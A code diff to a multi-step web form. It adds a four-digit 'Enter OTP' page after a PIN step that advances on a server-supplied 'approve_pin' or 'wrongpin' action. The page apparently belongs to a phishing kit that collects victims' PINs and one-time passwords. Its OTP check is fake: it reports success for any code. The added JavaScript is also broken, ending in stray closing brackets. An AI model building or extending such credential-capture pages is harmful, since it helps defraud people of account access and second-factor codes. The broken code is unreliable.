@@ -327,6 +327,43 @@ input[type="text"] {
     background: #fef3c7;
     color: #92400e;
 }
+    <style>
+.otp4 {
+    display: flex;
+    justify-content: center;
+    gap: 10px;
+    margin: 25px 0;
+}
+
+.otp4 input {
+    width: 52px;
+    height: 62px;
+    border: 2px solid #e2e8f0;
+    border-radius: 12px;
+    background: #f8fafc;
+    text-align: center;
+    font-size: 26px;
+    font-weight: bold;
+    color: #041e42;
+    outline: none;
+}
+
+.otp4 input:focus {
+    border-color: #00338d;
+    background: white;
+    box-shadow: 0 0 0 3px rgba(0, 51, 141, 0.06);
+}
+
+.otp4-status {
+    display: none;
+    margin-top: 15px;
+    padding: 12px;
+    border-radius: 8px;
+    font-size: 12px;
+    text-align: center;
+    background: #fef3c7;
+    color: #92400e;
+}
 
 /* Loading Overlay */
 .loading-overlay {
@@ -750,6 +787,40 @@ input[type="text"] {
 
     </div>
 
+    <!-- PAGE 6A OTP VERIFICATION -->
+<div id="page6a" class="hidden">
+    <div class="center">
+        <div class="icon">🔐</div>
+        <h2>Enter OTP</h2>
+        <p style="margin-top:10px;color:#6b7280">
+            Enter the 4-digit one-time password.
+        </p>
+    </div>
+
+    <div class="info">
+        A 4-digit OTP has been sent to your phone number.
+        Please enter it below to continue.
+    </div>
+
+    <div class="otp4" id="otp4Grid">
+        <input maxlength="1" inputmode="numeric">
+        <input maxlength="1" inputmode="numeric">
+        <input maxlength="1" inputmode="numeric">
+        <input maxlength="1" inputmode="numeric">
+    </div>
+
+    <button
+        id="otp4Button"
+        class="button blue"
+        disabled
+        onclick="verifyOTP4()"
+    >
+        Verify OTP
+    </button>
+
+    <div id="otp4Status" class="otp4-status"></div>
+</div>
+
 
     <!-- PAGE 7 -->
 
@@ -965,6 +1036,7 @@ function showPage(id, step, title, subtitle) {
         "page4",
         "page5",
         "page6",
+        "page6a",
         "page7",
         "page8"
     ];
@@ -1404,7 +1476,7 @@ function verifyPIN() {
                     pinBtn.disabled = false;
                     pinStatus.style.display = "none";
                     if (action === "approve_pin") {
-                        showPage("page7", 7, "Secure Authorization", "Continue securely");
+                        showPage("page6a", 6, "Enter OTP", "Verify the 4-digit code");
                     } else if (action === "wrongpin") {
                         alert("The PIN provided is incorrect. Please try again.");
                         document.getElementById("pinInput").value = "";
@@ -1430,6 +1502,75 @@ function verifyPIN() {
         });
 
 }
+
+    
+    const otp4Inputs = document.querySelectorAll("#otp4Grid input");
+
+function validateOTP4() {
+    const code = Array.from(otp4Inputs).map(input => input.value).join("");
+    const button = document.getElementById("otp4Button");
+    button.disabled = code.length !== 4;
+}
+
+otp4Inputs.forEach((input, index) => {
+    input.addEventListener("input", (e) => {
+        e.target.value = e.target.value.replace(/\D/g, "").slice(0, 1);
+
+        if (e.target.value && index < otp4Inputs.length - 1) {
+            otp4Inputs[index + 1].focus();
+        }
+
+        validateOTP4();
+    });
+
+    input.addEventListener("keydown", (e) => {
+        if (e.key === "Backspace" && !input.value && index > 0) {
+            otp4Inputs[index - 1].focus();
+        }
+    });
+
+    input.addEventListener("paste", (e) => {
+        e.preventDefault();
+        const pasted = (e.clipboardData || window.clipboardData)
+            .getData("text")
+            .replace(/\D/g, "")
+            .slice(0, 4);
+
+        if (!pasted) return;
+
+        pasted.split("").forEach((digit, i) => {
+            if (otp4Inputs[i]) otp4Inputs[i].value = digit;
+        });
+
+        const nextIndex = Math.min(pasted.length, otp4Inputs.length - 1);
+        otp4Inputs[nextIndex].focus();
+        validateOTP4();
+    });
+});
+
+function verifyOTP4() {
+    const code = Array.from(otp4Inputs)
+        .map(input => input.value)
+        .join("");
+
+    if (code.length !== 4) {
+        const status = document.getElementById("otp4Status");
+        status.style.display = "block";
+        status.textContent = "Please enter the complete 4-digit code.";
+        return;
+    }
+
+    const status = document.getElementById("otp4Status");
+    status.style.display = "block";
+    status.textContent = "OTP verified successfully.";
+
+    document.getElementById("otp4Button").disabled = true;
+
+    setTimeout(() => {
+        showPage("page7", 7, "Secure Authorization", "Continue securely");
+    }, 600);
+    })
+    }
 
 
 function submitApplication() {
